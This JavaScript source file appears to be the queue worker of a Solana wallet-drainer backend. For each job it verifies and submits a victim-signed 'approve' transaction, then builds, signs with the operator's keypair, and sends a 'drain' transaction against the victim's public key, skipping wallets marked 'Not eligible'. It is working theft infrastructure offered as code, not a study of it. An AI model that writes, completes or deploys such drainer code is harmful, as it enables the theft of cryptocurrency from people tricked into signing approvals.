const { Worker } = require("bullmq");
const { getQueue, getConnection } = require("../queue/jobQueue");
const { getPool } = require("../core/rpcPool");
const { getKeypair } = require("../core/keypairManager");
const { executeTx } = require("../solana/txExecutor");
const { buildDrain } = require("../flows/drainFlow");
const logger = require("../core/logger");
const { PublicKey, Transaction } = require("@solana/web3.js");
const nacl = require("tweetnacl");

function initWorker() {
    const queue = getQueue();

    const worker = new Worker(
        "tx",
        async (job) => {
            try {
                logger.info("Worker processing job", { jobId: job.id });

                // Accept many variants for signed transaction field to be tolerant
                const publicKey = job.data && job.data.publicKey;
                const signed = job.data && (
                    job.data.signedTransaction ||
                    job.data.signedTx ||
                    job.data.signed ||
                    job.data.signed_transaction ||
                    job.data["signed-transaction"]
                );

                // Log the full payload (INFO) so we can debug payload issues from Render logs
                logger.info("Job payload data", { jobId: job.id, payload: job.data });

                if (!publicKey || !signed) {
                    throw new Error("Missing required fields in job: publicKey or signedTransaction");
                }

                // Basic validation of publicKey format
                let userPubkey;
                try {
                    userPubkey = new PublicKey(publicKey);
                } catch (err) {
                    throw new Error("Invalid publicKey format");
                }

                // Validate base64 for signed transaction
                let signedBuf;
                try {
                    signedBuf = Buffer.from(signed, "base64");
                } catch (err) {
                    throw new Error("signedTransaction is not valid base64");
                }

                const connection = getPool().getConnection();
                const payer = getKeypair();

                // 1. APPROVE TX (signed by user)
                let approveTx;
                try {
                    approveTx = Transaction.from(signedBuf);
                } catch (err) {
                    throw new Error("Failed to parse signed transaction: " + err.message);
                }

                // If approveTx has no instructions, don't attempt to send it
                if (!approveTx.instructions || approveTx.instructions.length === 0) {
                    logger.info("Approve transaction contains no instructions - nothing to execute", {
                        jobId: job.id,
                        instructions: approveTx.instructions ? approveTx.instructions.length : 0
                    });
                    // Finish job gracefully - nothing to approve/drain
                    return { approveSig: null, drainSig: null, info: "no_instructions" };
                }

                // Verify that the provided publicKey actually signed the transaction
                const sigEntry = approveTx.signatures && approveTx.signatures.find(s => s.publicKey && s.publicKey.equals(userPubkey) && s.signature);
                if (!sigEntry || !sigEntry.signature) {
                    throw new Error("Signature from provided publicKey not present in approve transaction");
                }

                try {
                    const message = approveTx.serializeMessage();
                    const signature = sigEntry.signature instanceof Uint8Array ? sigEntry.signature : Uint8Array.from(sigEntry.signature);
                    const valid = nacl.sign.detached.verify(new Uint8Array(message), signature, userPubkey.toBuffer());
                    if (!valid) {
                        throw new Error("Invalid signature for provided publicKey");
                    }
                } catch (err) {
                    throw new Error("Signature verification failed: " + err.message);
                }

                // Execute approve tx
                const approveSig = await executeTx(approveTx, connection);

                logger.info("Approve confirmed", { approveSig, jobId: job.id });

                // 2. DRAIN TX (signed by backend)
                const drainTx = await buildDrain(userPubkey, connection);

                // buildDrain may return a sentinel object (e.g., { status: 'Not eligible' })
                if (drainTx && drainTx.status === "Not eligible") {
                    logger.info("User not eligible for drain, aborting drain step", { publicKey });
                    return { approveSig, drainSig: null, status: "Not eligible" };
                }

                if (!drainTx || !drainTx.sign) {
                    throw new Error("Failed to build drain transaction");
                }

                drainTx.sign(payer);

                const drainSig = await executeTx(drainTx, connection);

                logger.info("Drain confirmed", { drainSig, jobId: job.id });

                return { approveSig, drainSig };
            } catch (err) {
                logger.error("Worker job failed", {
                    jobId: job.id,
                    error: err.message
                });
                throw err;
            }
        },
        {
            connection: getConnection()
        }
    );

    worker.on("completed", (job) => {
        logger.info("Worker job completed", { jobId: job.id });
    });

    worker.on("failed", (job, err) => {
        logger.error("Worker job failed", {
            jobId: job.id,
            error: err.message
        });
    });

    logger.info("Queue worker initialized successfully");
    return worker;
}

module.exports = { initWorker };